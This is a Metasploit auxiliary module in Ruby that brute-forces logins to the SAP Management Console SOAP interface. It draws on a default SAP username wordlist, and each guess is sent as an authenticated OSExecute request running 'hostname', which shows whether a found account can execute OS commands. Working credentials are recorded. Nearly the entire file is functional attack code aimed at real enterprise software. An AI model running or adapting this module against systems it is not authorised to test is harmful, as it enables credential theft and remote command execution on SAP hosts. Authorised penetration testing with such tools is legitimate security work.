##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit4 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::AuthBrute

  def initialize
    super(
      'Name'           => 'SAP Management Console Brute Force',
      'Description'    => %q{
        This module simply attempts to brute force the username |
        password for the SAP Management Console SOAP Interface. By
        setting the SAP SID value, a list of default SAP users can be
        tested without needing to set a USERNAME or USER_FILE value.
        The default usernames are stored in
        ./data/wordlists/sap_common.txt (the value of SAP SID is
        automatically inserted into the username to replce <SAPSID>).
        },
      'References'     =>
        [
          # General
          [ 'URL', 'http://blog.c22.cc' ]
        ],
      'Author'         => [ 'Chris John Riley' ],
      'License'        => MSF_LICENSE
    )

    register_options(
      [
        Opt::RPORT(50013),
        OptString.new('SAP_SID', [false, 'Input SAP SID to attempt brute-forcing standard SAP accounts ', '']),
        OptString.new('URI', [false, 'Path to the SAP Management Console ', '/']),
      ], self.class)
    register_autofilter_ports([ 50013 ])
  end

  def run_host(ip)
    res = send_request_cgi({
      'uri'     => normalize_uri(datastore['URI']),
      'method'  => 'GET'
    }, 25)

    if not res
      print_error("#{rhost}:#{rport} [SAP] Unable to connect")
      return
    end

    if datastore['SAP_SID'] != ''
      if !datastore['USER_FILE'].nil?
        print_status("SAPSID set to '#{datastore['SAP_SID']}' - Using provided wordlist")
      elsif !datastore['USERPASS_FILE'].nil?
        print_status("SAPSID set to '#{datastore['SAP_SID']}' - Using provided wordlist")
      else
        print_status("SAPSID set to '#{datastore['SAP_SID']}' - Setting default SAP wordlist")
        datastore['USER_FILE'] = Msf::Config.data_directory + '/wordlists/sap_common.txt'
      end
    end

    each_user_pass do |user, pass|
      enum_user(user,pass)
    end

  end

  def enum_user(user, pass)

    # Replace placeholder with SAP SID, if present
    if datastore['SAP_SID'] != ''
      user = user.gsub("<SAPSID>", datastore["SAP_SID"].downcase)
      pass = pass.gsub("<SAPSID>", datastore["SAP_SID"])
    end

    print_status("#{rhost}:#{rport} - Trying username:'#{user}' password:'#{pass}'")
    success = false

    soapenv = 'http://schemas.xmlsoap.org/soap/envelope/'
    xsi = 'http://www.w3.org/2001/XMLSchema-instance'
    xs = 'http://www.w3.org/2001/XMLSchema'
    sapsess = 'http://www.sap.com/webas/630/soap/features/session/'
    ns1 = 'ns1:OSExecute'

    data = '<?xml version="1.0" encoding="utf-8"?>' + "\r\n"
    data << '<SOAP-ENV:Envelope xmlns:SOAP-ENV="' + soapenv + '"  xmlns:xsi="' + xsi + '" xmlns:xs="' + xs + '">' + "\r\n"
    data << '<SOAP-ENV:Header>' + "\r\n"
    data << '<sapsess:Session xlmns:sapsess="' + sapsess + '">' + "\r\n"
    data << '<enableSession>true</enableSession>' + "\r\n"
    data << '</sapsess:Session>' + "\r\n"
    data << '</SOAP-ENV:Header>' + "\r\n"
    data << '<SOAP-ENV:Body>' + "\r\n"
    data << '<' + ns1 + ' xmlns:ns1="urn:SAPControl"><command>hostname</command><async>0</async></' + ns1 + '>' + "\r\n"
    data << '</SOAP-ENV:Body>' + "\r\n"
    data << '</SOAP-ENV:Envelope>' + "\r\n\r\n"

    user_pass = Rex::Text.encode_base64(user + ":" + pass)

    begin
      res = send_request_raw({
        'uri'      => normalize_uri(datastore['URI']),
        'method'   => 'POST',
        'data'     => data,
        'headers'  =>
          {
            'Content-Length' => data.length,
            'SOAPAction'     => '""',
            'Content-Type'   => 'text/xml; charset=UTF-8',
            'Authorization'  => 'Basic ' + user_pass
          }
      }, 45)

      return if not res

      if (res.code != 500 and res.code != 200)
        return
      else
        body = res.body
        if body.match(/Invalid Credentials/i)
          success = false
        else
          success = true
          if body.match(/Permission denied/i)
            permission = false
          end

          if body.match(/OSExecuteResponse/i)
            permission = true
          end
        end
      end

    rescue ::Rex::ConnectionError
      print_error("#{rhost}:#{rport} [SAP #{rhost}] Unable to connect")
      return
    end

    if success
      print_good("#{rhost}:#{rport} [SAP] Successful login '#{user}' password: '#{pass}'")

      if permission
        vprint_good("#{rhost}:#{rport} [SAP] Login '#{user}' authorized to perform OSExecute calls")
      else
        vprint_error("#{rhost}:#{rport} [SAP] Login '#{user}' NOT authorized to perform OSExecute calls")
      end

      report_auth_info(
        :host => rhost,
        :sname => 'sap-managementconsole',
        :proto => 'tcp',
        :port => rport,
        :user => user,
        :pass => pass,
        :source_type => "user_supplied",
        :target_host => rhost,
        :target_port => rport
      )
      return
    else
      vprint_error("#{rhost}:#{rport} [SAP] failed to login as '#{user}':'#{pass}'")
      return
    end
  end
end
